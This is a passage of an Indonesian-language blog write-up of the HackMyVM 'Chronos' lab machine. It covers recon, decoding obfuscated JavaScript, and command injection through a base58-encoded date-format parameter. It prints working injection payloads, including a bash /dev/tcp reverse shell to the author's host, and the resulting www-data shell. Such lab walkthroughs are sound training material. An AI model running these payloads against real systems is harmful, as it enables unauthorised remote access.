<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackMyVM: Chronos | sharpicx</title>
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="HackMyVM: Chronos" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Habis dipusingin sama soal binary exploit di picoctf jadi kangen main boot2root di HackMyVM dan juga kangen nulis writeup di blog, apalagi HMV udah jarang saya tulis. yang kemaren aja machine box easy semua, hehe. Saya juga udah jarang nulis note kalo habis dapet ilmu baru entah karena apa tapi kurang lebih rasa males yang menghantui pikiran saya. Saya juga mikir “buat apa juga nulis di blog kalo di internet banyak note orang, tinggal dibookmark aja kan gampang”. Kurang lebih pikiran itu yang merusak segala visi misi saya." />
<meta property="og:description" content="Habis dipusingin sama soal binary exploit di picoctf jadi kangen main boot2root di HackMyVM dan juga kangen nulis writeup di blog, apalagi HMV udah jarang saya tulis. yang kemaren aja machine box easy semua, hehe. Saya juga udah jarang nulis note kalo habis dapet ilmu baru entah karena apa tapi kurang lebih rasa males yang menghantui pikiran saya. Saya juga mikir “buat apa juga nulis di blog kalo di internet banyak note orang, tinggal dibookmark aja kan gampang”. Kurang lebih pikiran itu yang merusak segala visi misi saya." />
<link rel="canonical" href="http://localhost:4000/2021/09/16/hmv-chronos" />
<meta property="og:url" content="http://localhost:4000/2021/09/16/hmv-chronos" />
<meta property="og:site_name" content="sharpicx" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-09-16T16:03:26+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackMyVM: Chronos" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-09-16T16:03:26+07:00","datePublished":"2021-09-16T16:03:26+07:00","description":"Habis dipusingin sama soal binary exploit di picoctf jadi kangen main boot2root di HackMyVM dan juga kangen nulis writeup di blog, apalagi HMV udah jarang saya tulis. yang kemaren aja machine box easy semua, hehe. Saya juga udah jarang nulis note kalo habis dapet ilmu baru entah karena apa tapi kurang lebih rasa males yang menghantui pikiran saya. Saya juga mikir “buat apa juga nulis di blog kalo di internet banyak note orang, tinggal dibookmark aja kan gampang”. Kurang lebih pikiran itu yang merusak segala visi misi saya.","headline":"HackMyVM: Chronos","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/09/16/hmv-chronos"},"url":"http://localhost:4000/2021/09/16/hmv-chronos"}</script>
<!-- End Jekyll SEO tag -->


<meta name="keywords" content="nodejs,express-fileupload,CVE-2020-7699,RCE-PoC,base-56-cipher" />

<link rel="shortcut icon" href="/favicon.ico" />
<link rel="apple-touch-icon" href="/favicon.ico"/>
<link rel="alternate" type="application/rss+xml" title="sharpicx - linux & cybersecurity big fan " href="/feed.xml" />
<link rel="stylesheet" type="text/css" href="/assets/css/base.css" />
<link rel="stylesheet" type="text/css" href="/assets/css/highlight.css" />
<!-- <link rel="stylesheet" href="https://hackerthemes.com/bootstrap-themes/demo/theme-machine/neon-glow/css/bootstrap4-neon-glow.min.css"> -->
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">

<!--[if lt IE 9]>
  <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
<![endif]-->


<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async ></script>


<script src="/assets/script/jekyllpaper.js" async ></script>
<script src="https://unpkg.com/mermaid@8.5.1/dist/mermaid.min.js" onload="javascript:loadMermaid();" async></script>


</head>
<body>
  <div class="container-wrapper">
    <header class="container-header">
      <div class="header-info">
  <span class="header-info-name">sharpicx</span><br/>
  <span class="header-info-desc" style="padding-left: 25px">linux & cybersecurity big fan </span>
</div>
<nav class="header-nav">
  <ul class="header-main-nav">
  
    <li class="header-main-nav-item"><a href="/">home</a></li>
  
    <li class="header-main-nav-item"><a href="/category">categories</a></li>
  
    <li class="header-main-nav-item"><a href="/about">whoami</a></li>
  
  </ul>
</nav>

    </header>
    <main class="container-main">
      <article class="container-post">
  <div class="post-title" style="padding: 0px 0px 20px 0px">
    <h1>HackMyVM: Chronos</h1>
  </div>
  <div class="post-author">
    <span>sharpicx</span>
  </div>
  <div class="post-content">
    <p>Habis dipusingin sama soal binary exploit di <a href="https://picoctf">picoctf</a> jadi kangen main boot2root di <a href="https://hackmyvm.eu">HackMyVM</a> dan juga kangen nulis writeup di blog, apalagi HMV udah jarang saya tulis. yang kemaren aja machine box easy semua, hehe. Saya juga udah jarang nulis note kalo habis dapet ilmu baru entah karena apa tapi kurang lebih rasa males yang menghantui pikiran saya. Saya juga mikir “buat apa juga nulis di blog kalo di internet banyak note orang, tinggal dibookmark aja kan gampang”. Kurang lebih pikiran itu yang merusak segala visi misi saya.</p>

<h2 id="machine-information">Machine Information</h2>

<table>
  <tbody>
    <tr>
      <td><strong>Details</strong></td>
      <td> </td>
    </tr>
    <tr>
      <td>Machine Name</td>
      <td><a href="https:https://hackmyvm.eu/machines/machine.php?vm=Chronos">Chronos</a></td>
    </tr>
    <tr>
      <td>Difficulty Level</td>
      <td><span style="color: #B79616; font-weight: bold;">Medium</span></td>
    </tr>
    <tr>
      <td>Machine Released</td>
      <td><strong>7, August 2021</strong></td>
    </tr>
    <tr>
      <td>Date I complete it</td>
      <td><strong>16, September</strong></td>
    </tr>
  </tbody>
</table>

<h2 id="recon">Recon</h2>

<h2 id="finding-ip-target">Finding IP target</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Currently scanning: 192.168.86.0/16   |   Screen View: Unique Hosts             
                                                                                 
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 102                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 <span class="nt">-----------------------------------------------------------------------------</span>
 192.168.56.100  <span class="c">#################      1      42  PCS Systemtechnik GmbH        </span>
 192.168.56.108  08:00:27:49:f3:fa      1      60  PCS Systemtechnik GmbH   

</code></pre></div></div>
<p>sebenarnya gak usah repot-repot saya sensor sih, itu juga host yang dibuat virtualbox sendiri.</p>

<h2 id="nmap-scanning">Nmap scanning</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 e4:f2:83:a4:38:89:8d:86:a5:e1:31:76:eb:9d:5f:ea <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFF8YjHtqC35Tv6qgLJ0kNRdjbf30IJ3vKLgvfu9i0tKcx3+TpxYz91j2DXQazjyUpfbIV+fQJb5uyl1iaXHcuvLcQ/wx2WzqzYCmvwM0UzChbwlIUxBpCgfx8wRYNJSwGbgPRoHnXLFquLf47q5nugN87esyyMM0UIaMYo3rNspZtB8QsdzZD2m5RqqI45ab8ByrQZbp8PP7XxTUXWT1ulcAABUbWnRR6VJDL72IQy3G8gpDoU95p4feodti3EA97jwbuNq9G+XeLK2BX4Y5SLpqgYazTWw8scw71hPea4r2YvtJNv6aQJBjMTzDfUm1CQ7pc1qN1T+1vujcyzO7J
|   256 41:5a:21:c4:58:f2:2b:e4:8a:2f:31:73:ce:fd:37:ad <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO/PvsX6OqdIiLIzv+JlEolWwqi2s/gnJGADk2W0miSvnZNH2CZ/MAz6qxC4tRLsQl1eI2i43+Wd3tw6pyNvmSg<span class="o">=</span>
|   256 9b:34:28:c2:b9:33:4b:37:d5:01:30:6f:87:c4:6b:23 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGOQB+a1NPS+fokbiT0hLgpNOYdGG/5+ZVsOoCCn0TyO
80/tcp   open  http    syn-ack Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
8000/tcp open  http    syn-ack Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span><span class="nb">.</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

</code></pre></div></div>
<p>Ports scanned, i got 22 stands for SSH, 80 for http running on Apache, and 8000 running on Node.js Express Framework. belom pernah ketemu seumur hidup nih server-side yang pake framework js”an. walaupun ada port SSH opened, di machine kali ini saya tidak akan menyentuh sama sekali. jelas nyaman pake reverse shell.</p>

<h2 id="website-view-code">Website view-code</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arin@aoba ~/Desktop/boot2roots/hmv/chronos<span class="nv">$ </span>curl http://192.168.56.108/
</code></pre></div></div>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">##</span> <span class="nx">Ada</span> <span class="nx">sesuatu</span> <span class="nx">dibagian</span> <span class="nx">bawah</span> <span class="err">##</span>

<span class="kd">var</span> <span class="nx">_0x5bdf</span><span class="o">=</span><span class="p">[</span><span class="dl">'</span><span class="s1">150447srWefj</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">70lwLrol</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">1658165LmcNig</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">1260881JUqdKM</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">10737CrnEEe</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">2SjTdWC</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">readyState</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">1278676qXleJg</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">797116soVTES</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">onreadystatechange</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">User-Agent</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">status</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">1DYOODT</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">400909Mbbcfr</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Chronos</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">2QRBPWS</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">innerHTML</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">date</span><span class="dl">'</span><span class="p">];(</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x506b95</span><span class="p">,</span><span class="nx">_0x817e36</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0x244260</span><span class="o">=</span><span class="nx">_0x432d</span><span class="p">;</span><span class="k">while</span><span class="p">(</span><span class="o">!!</span><span class="p">[]){</span><span class="k">try</span><span class="p">{</span><span class="kd">var</span> <span class="nx">_0x35824b</span><span class="o">=-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">))</span><span class="o">*</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x90</span><span class="p">))</span><span class="o">+</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x8e</span><span class="p">))</span><span class="o">+</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x7f</span><span class="p">))</span><span class="o">*</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x83</span><span class="p">))</span><span class="o">+-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x87</span><span class="p">))</span><span class="o">+-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x82</span><span class="p">))</span><span class="o">*</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x8d</span><span class="p">))</span><span class="o">+-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x88</span><span class="p">))</span><span class="o">+</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x80</span><span class="p">))</span><span class="o">*</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x84</span><span class="p">));</span><span class="k">if</span><span class="p">(</span><span class="nx">_0x35824b</span><span class="o">===</span><span class="nx">_0x817e36</span><span class="p">)</span><span class="k">break</span><span class="p">;</span><span class="k">else</span> <span class="nx">_0x506b95</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x506b95</span><span class="p">[</span><span class="dl">'</span><span class="s1">shift</span><span class="dl">'</span><span class="p">]());}</span><span class="k">catch</span><span class="p">(</span><span class="nx">_0x3fb1dc</span><span class="p">){</span><span class="nx">_0x506b95</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x506b95</span><span class="p">[</span><span class="dl">'</span><span class="s1">shift</span><span class="dl">'</span><span class="p">]());}}}(</span><span class="nx">_0x5bdf</span><span class="p">,</span><span class="mh">0xcaf1e</span><span class="p">));</span><span class="kd">function</span> <span class="nx">_0x432d</span><span class="p">(</span><span class="nx">_0x16bd66</span><span class="p">,</span><span class="nx">_0x33ffa9</span><span class="p">){</span><span class="k">return</span> <span class="nx">_0x432d</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x5bdf82</span><span class="p">,</span><span class="nx">_0x432dc8</span><span class="p">){</span><span class="nx">_0x5bdf82</span><span class="o">=</span><span class="nx">_0x5bdf82</span><span class="o">-</span><span class="mh">0x7e</span><span class="p">;</span><span class="kd">var</span> <span class="nx">_0x4da6e8</span><span class="o">=</span><span class="nx">_0x5bdf</span><span class="p">[</span><span class="nx">_0x5bdf82</span><span class="p">];</span><span class="k">return</span> <span class="nx">_0x4da6e8</span><span class="p">;},</span><span class="nx">_0x432d</span><span class="p">(</span><span class="nx">_0x16bd66</span><span class="p">,</span><span class="nx">_0x33ffa9</span><span class="p">);}</span><span class="kd">function</span> <span class="nx">loadDoc</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">_0x17df92</span><span class="o">=</span><span class="nx">_0x432d</span><span class="p">,</span><span class="nx">_0x1cff55</span><span class="o">=</span><span class="nx">_0x17df92</span><span class="p">(</span><span class="mh">0x8f</span><span class="p">),</span><span class="nx">_0x2beb35</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span><span class="nx">_0x2beb35</span><span class="p">[</span><span class="nx">_0x17df92</span><span class="p">(</span><span class="mh">0x89</span><span class="p">)]</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">_0x146f5d</span><span class="o">=</span><span class="nx">_0x17df92</span><span class="p">;</span><span class="k">this</span><span class="p">[</span><span class="nx">_0x146f5d</span><span class="p">(</span><span class="mh">0x85</span><span class="p">)]</span><span class="o">==</span><span class="mh">0x4</span><span class="o">&amp;&amp;</span><span class="k">this</span><span class="p">[</span><span class="nx">_0x146f5d</span><span class="p">(</span><span class="mh">0x8c</span><span class="p">)]</span><span class="o">==</span><span class="mh">0xc8</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x146f5d</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)](</span><span class="nx">_0x146f5d</span><span class="p">(</span><span class="mh">0x93</span><span class="p">))[</span><span class="nx">_0x146f5d</span><span class="p">(</span><span class="mh">0x92</span><span class="p">)]</span><span class="o">=</span><span class="k">this</span><span class="p">[</span><span class="nx">_0x146f5d</span><span class="p">(</span><span class="mh">0x86</span><span class="p">)]);},</span><span class="nx">_0x2beb35</span><span class="p">[</span><span class="nx">_0x17df92</span><span class="p">(</span><span class="mh">0x81</span><span class="p">)](</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span><span class="nx">_0x17df92</span><span class="p">(</span><span class="mh">0x8a</span><span class="p">),</span><span class="o">!!</span><span class="p">[]),</span><span class="nx">_0x2beb35</span><span class="p">[</span><span class="dl">'</span><span class="s1">setRequestHeader</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x17df92</span><span class="p">(</span><span class="mh">0x8b</span><span class="p">),</span><span class="nx">_0x1cff55</span><span class="p">),</span><span class="nx">_0x2beb35</span><span class="p">[</span><span class="dl">'</span><span class="s1">send</span><span class="dl">'</span><span class="p">]();}</span>

</code></pre></div></div>
<p>tanpa melihat renderan dari port 80, dari source web sendiri terlihat aneh dibagian script. disana ditujukan ke <strong>http://chronos.local</strong>. Ok host baru yang harus dibuat di <em>/etc/hosts</em>.</p>

<h2 id="directory-brute-forcing">Directory Brute-forcing</h2>

<p>dari <strong>gobuster</strong> sampai <strong>dirsearch</strong>. Result yang saya dapatkan selalu seperti ini.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://chronos.local/css/]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
</code></pre></div></div>
<p>Karna baru tingkat emosi habis ada masalah hidup, jadi hilang konsen. saya lupa kalo ada port 8000 yang terbuka, hehe. jadi tidak ada yang menarik for this part.</p>

<h2 id="escalate-as-www-data">Escalate as www-data</h2>
<p>PS: rada ribet.</p>

<p>Karna tadi, domain host berubah dan dibagian URL terlihat seperti query. saya mencoba untuk melihat source dari <strong>http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ</strong> menggunakan <strong>curl</strong> lagi.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arin@aoba ~/Desktop/boot2roots/hmv/chronos <span class="nv">$ </span>curl http://chronos.local:8000/date<span class="se">\?</span>format<span class="se">\=</span>4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
Permission Denied%

</code></pre></div></div>
<p>Loh, permission denied?. saya coba liat lagi code javascript yang menurut saya terlihat seperti sudah diobfuscate. ada code seperti ini.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'User-Agent','status','</span><span class="mi">1</span><span class="err">DYOODT','</span><span class="mi">400909</span><span class="err">Mbbcfr','Chronos','</span><span class="mi">2</span><span class="err">QRBPWS','getElementById','innerHTML','date'</span><span class="w">
</span></code></pre></div></div>
<p>Dari kedua ini, saya menyimpulkan bahwa format ini adalah tanggal yang dibuat menjadi cipher text.</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"loadDoc()"</span><span class="nt">&gt;</span>

  <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"wrapper"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"future-cop"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"future"</span><span class="nt">&gt;</span>Chronos - Date <span class="err">&amp;</span> Time<span class="nt">&lt;/h3&gt;</span>
      <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"cop"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;p</span> <span class="na">id=</span><span class="s">"date"</span><span class="nt">&gt;&lt;/p&gt;</span>
      <span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;script&gt;</span>
</code></pre></div></div>
<p>Saya ke <a href="https://dcode.fr/">https://dcode.fr/</a> mencoba untuk mengindentifikasi bentuk cipher ini. ternyata <strong>base-58</strong>. saya coba <strong>curl</strong> (apa sih ga tau nama istilahnya hehe) dengan mengoverwrite <strong>User-Agent: Chronos</strong> seperti yang ada di bagian JS yang diobfuscate tadi.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arin@aoba ~/Desktop/boot2roots/hmv/chronos <span class="nv">$ </span>curl http://chronos.local:8000/date<span class="se">\?</span>format<span class="se">\=</span>4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL <span class="nt">-H</span> <span class="s2">"User-Agent: Chronos"</span>
Today is Thursday, September 16, 2021 08:37:10.

</code></pre></div></div>
<p>Benerkan tanggal. Ok sampai sini saya berfikir bagaimana jika reverse shell diencrypt dengan base-58? tapi saya test dulu.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span>curl http://192.168.56.1:2004
-&gt; uXN49Jdw8oBXUxPfRopqnHUK4jLyKTxw8o4Bci6KVQ
<span class="nt">---</span>
arin@aoba ~/Desktop/boot2roots/hmv/chronos <span class="nv">$ </span>curl http://chronos.local:8000/date<span class="se">\?</span>format<span class="se">\=</span>uXN49Jdw8oBXUxPfRopqnHUK4jLyKTxw8o4Bci6KVQ <span class="nt">-H</span> <span class="s2">"User-Agent: Chronos"</span>
<span class="nt">---</span>
arin@aoba ~ <span class="nv">$ </span>ncat <span class="nt">-nvlp</span> 2004
Ncat: Version 7.92 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::2004
Ncat: Listening on 0.0.0.0:2004
Ncat: Connection from 192.168.56.108.
Ncat: Connection from 192.168.56.108:33704.
GET / HTTP/1.1
Host: 192.168.56.1:2004
User-Agent: curl/7.58.0
Accept: <span class="k">*</span>/<span class="k">*</span>

</code></pre></div></div>
<p>OK REVERSE SHELL, GET IT.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span>bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/192.168.56.1/4242 0&gt;&amp;1'</span>
-&gt;25v919hbfMQqCv6QfhvvBc5iYdGcDgqbbt85MB6wUQfjQoec4PBgYon4cd1pjpVKqj1Ms4kqc
<span class="nt">---</span>
arin@aoba ~/Desktop/boot2roots/hmv/chronos <span class="nv">$ </span>curl http://chronos.local:8000/date<span class="se">\?</span>format<span class="se">\=</span>25v919hbfMQqCv6QfhvvBc5iYdGcDgqbbt85MB6wUQfjQoec4PBgYon4cd1pjpVKqj1Ms4kqc <span class="nt">-H</span> <span class="s2">"User-Agent: Chronos"</span>
<span class="nt">---</span>
arin@aoba ~ <span class="nv">$ </span>ncat <span class="nt">-nvlp</span> 4242
Ncat: Version 7.92 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 192.168.56.108.
Ncat: Connection from 192.168.56.108:55884.
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>771<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@chronos:/opt/chronos<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
www-data@chronos:/opt/chronos<span class="nv">$ </span>

</code></pre></div></div>

<h2 id="shell-as-imera">Shell as imera</h2>
<p>pergi kemana-mana, akhirnya nemu asik-asik.</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">www-data@chronos:/opt/chronos-v</span><span class="mi">2</span><span class="err">/backend$</span><span class="w"> </span><span class="err">cat</span><span class="w"> </span><span class="err">package.json</span><span class="w">
</span><span class="p">{</span><span class="w">
  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"some-website"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.0.0"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
  </span><span class="nl">"main"</span><span class="p">:</span><span class="w"> </span><span class="s2">"server.js"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"scripts"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"start"</span><span class="p">:</span><span class="w"> </span><span class="s2">"node server.js"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"author"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
  </span><span class="nl">"license"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ISC"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"dependencies"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"ejs"</span><span class="p">:</span><span class="w"> </span><span class="s2">"^3.1.5"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"express"</span><span class="p">:</span><span class="w"> </span><span class="s2">"^4.17.1"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"express-fileupload"</span><span class="p">:</span><span class="w"> </span><span class="s2">"^1.1.7-alpha.3"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">www-data@chronos:/opt/chronos-v</span><span class="mi">2</span><span class="err">/backend$</span><span class="w"> </span><span class="err">cat</span><span class="w"> </span><span class="err">server.js</span><span class="w">
</span><span class="err">const</span><span class="w"> </span><span class="err">express</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">require('express');</span><span class="w">
</span><span class="err">const</span><span class="w"> </span><span class="err">fileupload</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">require(</span><span class="s2">"express-fileupload"</span><span class="err">);</span><span class="w">
</span><span class="err">const</span><span class="w"> </span><span class="err">http</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">require('http')</span><span class="w">

</span><span class="err">const</span><span class="w"> </span><span class="err">app</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">express();</span><span class="w">

</span><span class="err">app.use(fileupload(</span><span class="p">{</span><span class="w"> </span><span class="err">parseNested:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">}</span><span class="err">));</span><span class="w">

</span><span class="err">app.set('view</span><span class="w"> </span><span class="err">engine',</span><span class="w"> </span><span class="err">'ejs');</span><span class="w">
</span><span class="err">app.set('views',</span><span class="w"> </span><span class="s2">"/opt/chronos-v2/frontend/pages"</span><span class="err">);</span><span class="w">

</span><span class="err">app.get('/',</span><span class="w"> </span><span class="err">(req,</span><span class="w"> </span><span class="err">res)</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
   </span><span class="err">res.render('index')</span><span class="w">
</span><span class="p">}</span><span class="err">);</span><span class="w">

</span><span class="err">const</span><span class="w"> </span><span class="err">server</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">http.Server(app);</span><span class="w">
</span><span class="err">const</span><span class="w"> </span><span class="err">addr</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="s2">"127.0.0.1"</span><span class="w">
</span><span class="err">const</span><span class="w"> </span><span class="err">port</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="mi">8080</span><span class="err">;</span><span class="w">
</span><span class="err">server.listen(port,</span><span class="w"> </span><span class="err">addr,</span><span class="w"> </span><span class="err">()</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
